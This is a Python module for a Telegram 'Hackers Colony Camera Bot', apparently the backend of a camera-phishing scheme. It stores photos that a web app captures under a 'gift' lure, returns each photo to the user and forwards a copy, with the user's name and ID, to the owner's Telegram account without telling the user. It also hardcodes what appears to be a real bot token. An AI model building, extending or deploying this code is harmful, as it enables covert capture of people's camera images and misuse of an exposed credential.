#!/usr/bin/env python3
"""
Hackers Colony Camera Bot
Advanced version with all features
"""

import os
import sys
import sqlite3
import threading
import time
import json
import base64
from datetime import datetime, timedelta
from typing import Optional, Tuple, List, Dict, Any

# ===== FIXED DATETIME FOR SQLITE 3.12 =====
def adapt_datetime(val):
    """Convert datetime to ISO format string for SQLite"""
    return val.isoformat()

def convert_datetime(val):
    """Convert ISO format string to datetime from SQLite"""
    return datetime.fromisoformat(val.decode())

# Register adapters for SQLite
sqlite3.register_adapter(datetime, adapt_datetime)
sqlite3.register_converter("TIMESTAMP", convert_datetime)

# ===== CONFIG =====
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8226782560:AAG2h1cqLmKnWvF7YlsdxJ3W8VPlDNe7qn8')
OWNER_ID = int(os.environ.get('OWNER_ID', 8215819954))
WEB_URL = os.environ.get('WEB_URL', 'https://hco-cam.onrender.com')
ADMIN_IDS = [OWNER_ID, 123456789]  # Add more admin IDs if needed

# ===== ADVANCED DATABASE FUNCTIONS =====
class DatabaseManager:
    """Advanced database management with connection pooling"""
    
    def __init__(self, db_path='bot_users.db'):
        self.db_path = db_path
        self._init_db()
    
    def _get_connection(self):
        """Get database connection with proper converters"""
        conn = sqlite3.connect(
            self.db_path, 
            detect_types=sqlite3.PARSE_DECLTYPES,
            check_same_thread=False
        )
        conn.row_factory = sqlite3.Row
        return conn
    
    def _init_db(self):
        """Initialize database with all tables"""
        conn = self._get_connection()
        c = conn.cursor()
        
        # Users table with indexes
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                join_date TIMESTAMP,
                last_active TIMESTAMP,
                photo_count INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                is_admin INTEGER DEFAULT 0,
                language_code TEXT DEFAULT 'en'
            )
        ''')
        
        # Photos table with index
        c.execute('''
            CREATE TABLE IF NOT EXISTS photos (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                timestamp TIMESTAMP,
                photo_type TEXT,
                file_id TEXT,
                file_size INTEGER,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        
        # Broadcasts table
        c.execute('''
            CREATE TABLE IF NOT EXISTS broadcasts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                message TEXT,
                message_type TEXT DEFAULT 'text',
                timestamp TIMESTAMP,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                total_count INTEGER DEFAULT 0
            )
        ''')
        
        # Create indexes for performance
        c.execute('CREATE INDEX IF NOT EXISTS idx_users_last_active ON users(last_active)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_photos_user_id ON photos(user_id)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_photos_timestamp ON photos(timestamp)')
        
        # Set owner as admin
        c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, is_admin) VALUES (?, ?, ?, ?)',
                 (OWNER_ID, 'owner', 'Owner', 1))
        
        conn.commit()
        conn.close()
        print("✅ Database initialized with advanced features")
    
    def add_user(self, user_id: int, username: Optional[str], 
                 first_name: Optional[str], last_name: Optional[str]):
        """Add or update user"""
        conn = self._get_connection()
        c = conn.cursor()
        now = datetime.now()
        
        c.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, username, first_name, last_name, join_date, last_active) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, username, first_name, last_name, now, now))
        
        conn.commit()
        conn.close()
        return True
    
    def update_activity(self, user_id: int):
        """Update user's last activity time"""
        conn = self._get_connection()
        c = conn.cursor()
        now = datetime.now()
        
        c.execute('UPDATE users SET last_active = ? WHERE user_id = ?', (now, user_id))
        conn.commit()
        conn.close()
        return True
    
    def add_photo(self, user_id: int, photo_type: str, file_id: str = None, 
                  file_size: int = None) -> int:
        """Add photo record and return photo ID"""
        conn = self._get_connection()
        c = conn.cursor()
        now = datetime.now()
        
        c.execute('''
            INSERT INTO photos (user_id, timestamp, photo_type, file_id, file_size)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, now, photo_type, file_id, file_size))
        
        photo_id = c.lastrowid
        
        # Update user's photo count
        c.execute('UPDATE users SET photo_count = photo_count + 1 WHERE user_id = ?', (user_id,))
        
        conn.commit()
        conn.close()
        return photo_id
    
    def get_user_stats(self) -> Dict[str, Any]:
        """Get comprehensive user statistics"""
        conn = self._get_connection()
        c = conn.cursor()
        
        # Total users
        c.execute('SELECT COUNT(*) FROM users WHERE is_banned = 0')
        total_users = c.fetchone()[0]
        
        # Total photos
        c.execute('SELECT COUNT(*) FROM photos')
        total_photos = c.fetchone()[0]
        
        # Today's date
        today = datetime.now().date()
        today_start = datetime.combine(today, datetime.min.time())
        today_end = datetime.combine(today, datetime.max.time())
        
        # Today's users
        c.execute('SELECT COUNT(*) FROM users WHERE join_date BETWEEN ? AND ?', 
                 (today_start, today_end))
        today_users = c.fetchone()[0]
        
        # Today's photos
        c.execute('SELECT COUNT(*) FROM photos WHERE timestamp BETWEEN ? AND ?', 
                 (today_start, today_end))
        today_photos = c.fetchone()[0]
        
        # Active users (last 24 hours)
        yesterday = datetime.now() - timedelta(days=1)
        c.execute('SELECT COUNT(*) FROM users WHERE last_active > ?', (yesterday,))
        active_users = c.fetchone()[0]
        
        # Banned users
        c.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1')
        banned_users = c.fetchone()[0]
        
        # Admin users
        c.execute('SELECT COUNT(*) FROM users WHERE is_admin = 1')
        admin_users = c.fetchone()[0]
        
        conn.close()
        
        return {
            'total_users': total_users,
            'total_photos': total_photos,
            'today_users': today_users,
            'today_photos': today_photos,
            'active_users': active_users,
            'banned_users': banned_users,
            'admin_users': admin_users,
            'timestamp': datetime.now()
        }
    
    def get_all_users(self, include_banned: bool = False) -> List[int]:
        """Get all user IDs"""
        conn = self._get_connection()
        c = conn.cursor()
        
        if include_banned:
            c.execute('SELECT user_id FROM users')
        else:
            c.execute('SELECT user_id FROM users WHERE is_banned = 0')
        
        users = [row[0] for row in c.fetchall()]
        conn.close()
        return users
    
    def get_user_info(self, user_id: int) -> Optional[Dict]:
        """Get detailed user information"""
        conn = self._get_connection()
        c = conn.cursor()
        
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        conn.close()
        
        if row:
            return dict(row)
        return None
    
    def update_user_ban(self, user_id: int, ban_status: bool) -> bool:
        """Ban or unban user"""
        conn = self._get_connection()
        c = conn.cursor()
        
        c.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', 
                 (1 if ban_status else 0, user_id))
        
        conn.commit()
        conn.close()
        return True
    
    def search_users(self, query: str, limit: int = 50) -> List[Dict]:
        """Search users by ID, username, or name"""
        conn = self._get_connection()
        c = conn.cursor()
        
        search_term = f'%{query}%'
        c.execute('''
            SELECT user_id, username, first_name, last_name, photo_count, is_banned
            FROM users 
            WHERE user_id LIKE ? OR username LIKE ? OR first_name LIKE ? OR last_name LIKE ?
            ORDER BY last_active DESC
            LIMIT ?
        ''', (search_term, search_term, search_term, search_term, limit))
        
        users = [dict(row) for row in c.fetchall()]
        conn.close()
        return users
    
    def get_recent_users(self, limit: int = 20) -> List[Dict]:
        """Get recent active users"""
        conn = self._get_connection()
        c = conn.cursor()
        
        c.execute('''
            SELECT user_id, username, first_name, last_name, photo_count, 
                   last_active, is_banned, is_admin
            FROM users 
            ORDER BY last_active DESC
            LIMIT ?
        ''', (limit,))
        
        users = [dict(row) for row in c.fetchall()]
        conn.close()
        return users
    
    def get_user_photos(self, user_id: int, limit: int = 20) -> List[Dict]:
        """Get user's photos"""
        conn = self._get_connection()
        c = conn.cursor()
        
        c.execute('''
            SELECT id, timestamp, photo_type, file_size
            FROM photos 
            WHERE user_id = ?
            ORDER BY timestamp DESC
            LIMIT ?
        ''', (user_id, limit))
        
        photos = [dict(row) for row in c.fetchall()]
        conn.close()
        return photos
    
    def add_broadcast(self, admin_id: int, message: str, 
                      message_type: str = 'text') -> int:
        """Add broadcast record"""
        conn = self._get_connection()
        c = conn.cursor()
        now = datetime.now()
        
        total_users = len(self.get_all_users())
        
        c.execute('''
            INSERT INTO broadcasts 
            (admin_id, message, message_type, timestamp, total_count)
            VALUES (?, ?, ?, ?, ?)
        ''', (admin_id, message, message_type, now, total_users))
        
        broadcast_id = c.lastrowid
        conn.commit()
        conn.close()
        return broadcast_id
    
    def update_broadcast_stats(self, broadcast_id: int, 
                               success_count: int, fail_count: int):
        """Update broadcast statistics"""
        conn = self._get_connection()
        c = conn.cursor()
        
        c.execute('''
            UPDATE broadcasts 
            SET success_count = ?, fail_count = ?
            WHERE id = ?
        ''', (success_count, fail_count, broadcast_id))
        
        conn.commit()
        conn.close()
        return True

# Initialize database
db = DatabaseManager()

# ===== TELEGRAM BOT FUNCTIONS =====
class TelegramBotManager:
    """Manage Telegram bot operations"""
    
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = OWNER_ID
        self.bot = None
        
        # Initialize bot if token is available
        if self.bot_token and self.bot_token != 'YOUR_BOT_TOKEN':
            try:
                from telegram import Bot
                self.bot = Bot(token=self.bot_token)
                print("✅ Telegram bot initialized")
            except ImportError:
                print("⚠️ python-telegram-bot not installed")
            except Exception as e:
                print(f"⚠️ Failed to initialize bot: {e}")
    
    def is_bot_available(self) -> bool:
        """Check if bot is available"""
        return self.bot is not None
    
    async def send_photo_async(self, chat_id: int, photo_bytes: bytes, 
                              caption: str = "") -> bool:
        """Send photo asynchronously"""
        if not self.bot:
            return False
        
        try:
            await self.bot.send_photo(
                chat_id=chat_id,
                photo=photo_bytes,
                caption=caption[:1024],  # Telegram caption limit
                parse_mode='HTML'
            )
            return True
        except Exception as e:
            print(f"❌ Failed to send photo to {chat_id}: {e}")
            return False
    
    async def send_message_async(self, chat_id: int, text: str, 
                                parse_mode: str = 'HTML') -> bool:
        """Send message asynchronously"""
        if not self.bot:
            return False
        
        try:
            await self.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode,
                disable_web_page_preview=True
            )
            return True
        except Exception as e:
            print(f"❌ Failed to send message to {chat_id}: {e}")
            return False
    
    def send_photo_threaded(self, chat_id: int, photo_bytes: bytes, 
                           caption: str = "") -> bool:
        """Send photo in a separate thread"""
        if not self.bot:
            return False
        
        try:
            import asyncio
            
            async def send():
                return await self.send_photo_async(chat_id, photo_bytes, caption)
            
            # Run in new event loop
            def run_async():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    result = loop.run_until_complete(send())
                    return result
                finally:
                    loop.close()
            
            # Start thread
            thread = threading.Thread(target=run_async, daemon=True)
            thread.start()
            return True
            
        except Exception as e:
            print(f"❌ Threaded send failed: {e}")
            return False

# Initialize Telegram bot manager
bot_manager = TelegramBotManager()

# ===== WEB APP FUNCTIONS =====
def process_web_photo(user_id: int, photo_data: dict) -> Dict[str, Any]:
    """
    Process photo from web app
    Args:
        user_id: Telegram user ID
        photo_data: Dictionary with 'photo' (base64), 'label', 'timestamp'
    Returns:
        Dictionary with success status and message
    """
    try:
        # Validate input
        if not user_id or 'photo' not in photo_data:
            return {'success': False, 'error': 'Invalid input'}
        
        photo_base64 = photo_data['photo']
        label = photo_data.get('label', 'unknown')
        
        # Decode base64 photo
        try:
            photo_bytes = base64.b64decode(photo_base64)
        except:
            return {'success': False, 'error': 'Invalid photo data'}
        
        # Save to database
        photo_id = db.add_photo(user_id, f"web_{label}")
        
        # Send to user via Telegram bot
        user_caption = f"🎁 Your Gift Photo: {label}"
        bot_manager.send_photo_threaded(user_id, photo_bytes, user_caption)
        
        # Send to owner if not owner
        if int(user_id) != OWNER_ID:
            user_info = db.get_user_info(user_id)
            user_name = user_info.get('first_name', f'User_{user_id}') if user_info else f'User_{user_id}'
            owner_caption = f"📸 From: {user_name} (ID: {user_id})\nLabel: {label}"
            bot_manager.send_photo_threaded(OWNER_ID, photo_bytes, owner_caption)
        
        return {
            'success': True,
            'photo_id': photo_id,
            'message': 'Photo processed successfully',
            'sent_to_user': True,
            'sent_to_owner': int(user_id) != OWNER_ID
        }
        
    except Exception as e:
        print(f"❌ Error processing web photo: {e}")
        return {'success': False, 'error': str(e)}

# ===== ADMIN FUNCTIONS =====
def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    if user_id in ADMIN_IDS:
        return True
    
    user_info = db.get_user_info(user_id)
    return user_info and user_info.get('is_admin') == 1

def promote_to_admin(user_id: int) -> bool:
    """Promote user to admin"""
    conn = db._get_connection()
    c = conn.cursor()
    
    c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (user_id,))
    
    conn.commit()
    conn.close()
    return True

# ===== EXPORT FUNCTIONS =====
# These functions are imported by server.py
def get_system_stats() -> Dict[str, Any]:
    """Get comprehensive system statistics"""
    user_stats = db.get_user_stats()
    
    return {
        **user_stats,
        'bot_available': bot_manager.is_bot_available(),
        'web_url': WEB_URL,
        'server_time': datetime.now().isoformat(),
        'system': {
            'python_version': sys.version,
            'platform': sys.platform
        }
    }

def get_admin_dashboard() -> Dict[str, Any]:
    """Get data for admin dashboard"""
    stats = db.get_user_stats()
    recent_users = db.get_recent_users(10)
    
    # Get hourly activity for last 24 hours
    hourly_activity = []
    for i in range(24):
        hour_start = datetime.now() - timedelta(hours=24-i)
        hour_end = hour_start + timedelta(hours=1)
        
        conn = db._get_connection()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM photos WHERE timestamp BETWEEN ? AND ?', 
                 (hour_start, hour_end))
        photos_count = c.fetchone()[0]
        conn.close()
        
        hourly_activity.append({
            'hour': hour_start.hour,
            'photos': photos_count,
            'time': hour_start.strftime('%H:00')
        })
    
    return {
        'stats': stats,
        'recent_users': recent_users,
        'hourly_activity': hourly_activity,
        'total_broadcasts': 0,  # You can implement this
        'active_sessions': threading.active_count() - 1
    }

# Export for server.py
__all__ = [
    'db', 'bot_manager', 'process_web_photo', 'get_system_stats',
    'get_admin_dashboard', 'is_admin', 'promote_to_admin',
    'OWNER_ID', 'BOT_TOKEN', 'WEB_URL'
]

# ===== MAIN EXECUTION =====
if __name__ == '__main__':
    print("=" * 50)
    print("🚀 Hackers Colony Camera Bot - Advanced Version")
    print("=" * 50)
    
    # Show system stats
    stats = get_system_stats()
    print(f"👥 Total Users: {stats['total_users']}")
    print(f"📸 Total Photos: {stats['total_photos']}")
    print(f"📊 Today's Users: {stats['today_users']}")
    print(f"🖼️ Today's Photos: {stats['today_photos']}")
    print(f"⚡ Active Users (24h): {stats['active_users']}")
    print(f"🤖 Bot Available: {stats['bot_available']}")
    print(f"🌐 Web URL: {WEB_URL}")
    print("=" * 50)
    
    # Keep the script running for testing
    print("✅ Bot module loaded successfully")
    print("📁 Use with server.py for web interface")
